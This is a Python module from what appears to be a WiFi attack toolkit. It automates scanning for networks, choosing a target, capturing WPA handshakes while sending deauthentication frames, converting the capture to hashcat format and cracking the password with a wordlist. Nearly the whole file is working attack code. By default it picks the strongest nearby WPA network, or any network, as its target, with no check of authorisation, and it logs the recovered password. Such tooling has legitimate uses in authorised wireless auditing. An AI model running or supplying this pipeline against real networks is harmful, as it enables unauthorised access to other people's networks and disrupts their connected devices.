"""Scan → Capture → Crack workflow.

Automated pipeline that scans for WiFi networks, captures WPA handshakes
(or PMKID), and then cracks the captured credentials.
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Optional

from wifi_aio.automation.workflow_engine import (
    ErrorStrategy,
    WorkflowEngine,
    WorkflowResult,
    WorkflowStep,
)
from wifi_aio.exceptions import (
    AutomationError,
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
)

logger = logging.getLogger(__name__)


@dataclass
class ScanCaptureCrackConfig:
    """Configuration for the ScanCaptureCrack workflow.

    Attributes:
        interface: Wireless interface for scanning/capturing.
        scan_timeout: Seconds to spend scanning.
        scan_channel: Specific channel (0 = all channels).
        capture_timeout: Seconds to wait for handshake capture.
        deauth: Whether to send deauth frames during capture.
        deauth_count: Number of deauth frames per burst.
        deauth_interval: Seconds between deauth bursts.
        wordlist: Path to the wordlist for cracking.
        hash_type: Hashcat hash type number.
        use_cpu: Use CPU-based cracking instead of hashcat.
        target_ssid: SSID to target (empty = first WPA network).
        target_bssid: BSSID to target (overrides SSID matching).
        min_signal: Minimum signal strength in dBm.
        output_dir: Directory for capture output files.
    """

    interface: str = "wlan0"
    scan_timeout: int = 30
    scan_channel: int = 0
    capture_timeout: int = 120
    deauth: bool = True
    deauth_count: int = 5
    deauth_interval: int = 10
    wordlist: str = "/usr/share/wordlists/rockyou.txt"
    hash_type: int = 22000
    use_cpu: bool = False
    target_ssid: str = ""
    target_bssid: str = ""
    min_signal: int = -80
    output_dir: str = "/tmp/wifiaio_scc"


@dataclass
class ScanCaptureCrackResult:
    """Combined result of the ScanCaptureCrack workflow.

    Attributes:
        success: Whether the password was recovered.
        password: The cracked password (empty if not found).
        target_bssid: BSSID of the targeted AP.
        target_ssid: SSID of the targeted AP.
        scan_results: List of discovered access point dicts.
        capture_file: Path to the capture file.
        crack_result: Detailed cracking result dict.
        elapsed: Total wall-clock seconds.
    """

    success: bool = False
    password: str = ""
    target_bssid: str = ""
    target_ssid: str = ""
    scan_results: list[dict[str, Any]] = field(default_factory=list)
    capture_file: str = ""
    crack_result: dict[str, Any] = field(default_factory=dict)
    elapsed: float = 0.0


class ScanCaptureCrack:
    """Automated scan → capture → crack workflow.

    Scans for WiFi networks, captures a WPA handshake or PMKID from
    the best (or specified) target, converts to hashcat format, and
    runs a cracking attack.

    Example::

        workflow = ScanCaptureCrack(config=ScanCaptureCrackConfig(
            interface="wlan0mon",
            target_ssid="TargetNetwork",
            wordlist="/path/to/wordlist.txt",
        ))
        result = workflow.run()
        if result.success:
            print(f"Password: {result.password}")
    """

    def __init__(self, config: Optional[ScanCaptureCrackConfig] = None) -> None:
        self.config = config or ScanCaptureCrackConfig()
        self._engine = WorkflowEngine(name="scan_capture_crack")

    def _build_engine(self) -> WorkflowEngine:
        """Construct the workflow engine with all steps."""
        engine = WorkflowEngine(name="scan_capture_crack")
        engine.set_context("config", self.config)

        # Step 1: Scan
        engine.add_step(WorkflowStep(
            name="scan",
            action=self._step_scan,
            on_error=ErrorStrategy.STOP,
            timeout=60.0,
        ))

        # Step 2: Select target
        engine.add_step(WorkflowStep(
            name="select_target",
            action=self._step_select_target,
            condition=lambda ctx: bool(ctx.get("scan_results")),
            on_error=ErrorStrategy.STOP,
        ))

        # Step 3: Capture handshake
        engine.add_step(WorkflowStep(
            name="capture",
            action=self._step_capture,
            condition=lambda ctx: bool(ctx.get("target_bssid")),
            on_error=ErrorStrategy.RETRY,
            retries=2,
            retry_delay=5.0,
            timeout=180.0,
        ))

        # Step 4: Convert capture
        engine.add_step(WorkflowStep(
            name="convert",
            action=self._step_convert,
            condition=lambda ctx: bool(ctx.get("capture_file")),
            on_error=ErrorStrategy.STOP,
        ))

        # Step 5: Crack
        engine.add_step(WorkflowStep(
            name="crack",
            action=self._step_crack,
            condition=lambda ctx: bool(ctx.get("hash_file")),
            on_error=ErrorStrategy.CONTINUE,
            timeout=600.0,
        ))

        return engine

    # ── Steps ──────────────────────────────────────────────────────────

    def _step_scan(self, ctx: dict[str, Any]) -> list[dict[str, Any]]:
        """Scan for WiFi networks."""
        from wifi_aio.core.network_scanner import NetworkScanner

        cfg: ScanCaptureCrackConfig = ctx["config"]
        scanner = NetworkScanner(interface=cfg.interface)

        try:
            aps = scanner.scan(timeout=cfg.scan_timeout)
        except (WiFiPermissionError, WiFiTimeoutError):
            # Fallback to airodump backend
            aps = scanner.scan_airodump(
                channel=cfg.scan_channel or None,
                timeout=cfg.scan_timeout,
            )

        results = [ap.to_dict() for ap in aps]
        ctx["scan_results"] = results
        logger.info("Scan found %d access points", len(results))
        return results

    def _step_select_target(self, ctx: dict[str, Any]) -> dict[str, Any]:
        """Select the best target from scan results."""
        cfg: ScanCaptureCrackConfig = ctx["config"]
        results = ctx.get("scan_results", [])

        if not results:
            raise AutomationError("No scan results to select target from")

        target = None

        # If specific BSSID requested
        if cfg.target_bssid:
            for ap in results:
                if ap.get("bssid", "").lower() == cfg.target_bssid.lower():
                    target = ap
                    break

        # If specific SSID requested
        if target is None and cfg.target_ssid:
            for ap in results:
                if ap.get("ssid") == cfg.target_ssid:
                    target = ap
                    break

        # Fall back to strongest WPA/WPA2 network
        if target is None:
            candidates = [
                ap for ap in results
                if "WPA" in ap.get("security_type", "").upper()
                or "WPA" in ap.get("security", "").upper()
            ]
            # Filter by minimum signal
            candidates = [
                ap for ap in candidates
                if ap.get("signal_dbm", -100) >= cfg.min_signal
            ]
            if candidates:
                target = max(candidates, key=lambda a: a.get("signal_dbm", -100))

        # Last resort: any AP
        if target is None:
            candidates = [
                ap for ap in results
                if ap.get("signal_dbm", -100) >= cfg.min_signal
            ]
            if candidates:
                target = max(candidates, key=lambda a: a.get("signal_dbm", -100))

        if target is None:
            raise AutomationError("No suitable target found in scan results")

        ctx["target_bssid"] = target.get("bssid", "")
        ctx["target_ssid"] = target.get("ssid", "")
        ctx["target_channel"] = target.get("channel", 0)
        ctx["target"] = target
        logger.info(
            "Selected target: %s (%s) ch %d",
            ctx["target_ssid"], ctx["target_bssid"], ctx["target_channel"],
        )
        return target

    def _step_capture(self, ctx: dict[str, Any]) -> dict[str, Any]:
        """Capture a WPA handshake from the target."""
        import os
        from wifi_aio.core.handshake_capture import HandshakeCapture

        cfg: ScanCaptureCrackConfig = ctx["config"]
        os.makedirs(cfg.output_dir, exist_ok=True)

        capturer = HandshakeCapture(
            interface=cfg.interface,
            output_dir=cfg.output_dir,
        )

        safe_bssid = ctx["target_bssid"].replace(":", "")
        output_prefix = os.path.join(cfg.output_dir, f"handshake_{safe_bssid}")

        info = capturer.capture_handshake(
            bssid=ctx["target_bssid"],
            channel=ctx.get("target_channel", 0),
            ssid=ctx.get("target_ssid", ""),
            timeout=cfg.capture_timeout,
            deauth=cfg.deauth,
            deauth_count=cfg.deauth_count,
            deauth_interval=cfg.deauth_interval,
            output_prefix=output_prefix,
        )

        result = info.to_dict()
        if info.is_complete:
            ctx["capture_file"] = info.capture_file
            ctx["handshake_info"] = result
            logger.info("Handshake captured for %s", ctx["target_bssid"])
        else:
            logger.warning("Handshake capture incomplete for %s", ctx["target_bssid"])

        return result

    def _step_convert(self, ctx: dict[str, Any]) -> str:
        """Convert capture file to hashcat format."""
        import os
        from wifi_aio.core.handshake_capture import HandshakeCapture

        cfg: ScanCaptureCrackConfig = ctx["config"]
        capture_file = ctx.get("capture_file", "")

        # Find the actual pcap file if we only have a prefix
        pcap_file = capture_file
        if not os.path.isfile(pcap_file):
            for ext in [".cap", ".pcap", ".pcapng"]:
                for i in range(1, 10):
                    candidate = f"{capture_file}-{i:02d}{ext}"
                    if os.path.isfile(candidate):
                        pcap_file = candidate
                        break
                if os.path.isfile(pcap_file) and pcap_file != capture_file:
                    break

        if not os.path.isfile(pcap_file):
            raise AutomationError(f"Capture file not found: {pcap_file}")

        output_file = pcap_file.rsplit(".", 1)[0] + ".hc22000"

        capturer = HandshakeCapture(interface=cfg.interface)
        hash_file = capturer.convert_to_hc22000(pcap_file, output_file)
        ctx["hash_file"] = hash_file

        logger.info("Converted capture to %s", hash_file)
        return hash_file

    def _step_crack(self, ctx: dict[str, Any]) -> dict[str, Any]:
        """Crack the captured handshake."""
        import os
        from wifi_aio.core.password_cracker import PasswordCracker

        cfg: ScanCaptureCrackConfig = ctx["config"]
        hash_file = ctx.get("hash_file", "")

        if not hash_file or not os.path.isfile(hash_file):
            raise AutomationError(f"Hash file not found: {hash_file}")

        cracker = PasswordCracker()
        result = cracker.dictionary_attack(
            hash_file=hash_file,
            wordlist=cfg.wordlist,
            hash_type=cfg.hash_type,
            use_cpu=cfg.use_cpu,
        )

        crack_dict = result.to_dict()
        ctx["crack_result"] = crack_dict
        ctx["password_found"] = result.found
        ctx["password"] = result.password if result.found else ""

        if result.found:
            logger.info("Password found: %s", result.password)
        else:
            logger.info("Password not found in wordlist")

        return crack_dict

    # ── Public API ─────────────────────────────────────────────────────

    def run(self) -> ScanCaptureCrackResult:
        """Execute the full scan → capture → crack pipeline.

        Returns:
            ScanCaptureCrackResult with the outcome.
        """
        start = time.time()
        self._engine = self._build_engine()
        wf_result: WorkflowResult = self._engine.run()

        result = ScanCaptureCrackResult(
            success=wf_result.step_results.get("crack", {}).get("found", False)
            if isinstance(wf_result.step_results.get("crack"), dict)
            else wf_result.step_results.get("password_found", False),
            password=wf_result.step_results.get("password", ""),
            target_bssid=self._engine.get_context("target_bssid", ""),
            target_ssid=self._engine.get_context("target_ssid", ""),
            scan_results=self._engine.get_context("scan_results", []),
            capture_file=self._engine.get_context("capture_file", ""),
            crack_result=self._engine.get_context("crack_result", {}),
            elapsed=time.time() - start,
        )

        return result

    def __repr__(self) -> str:
        return (
            f"ScanCaptureCrack(interface={self.config.interface!r}, "
            f"target_ssid={self.config.target_ssid!r})"
        )
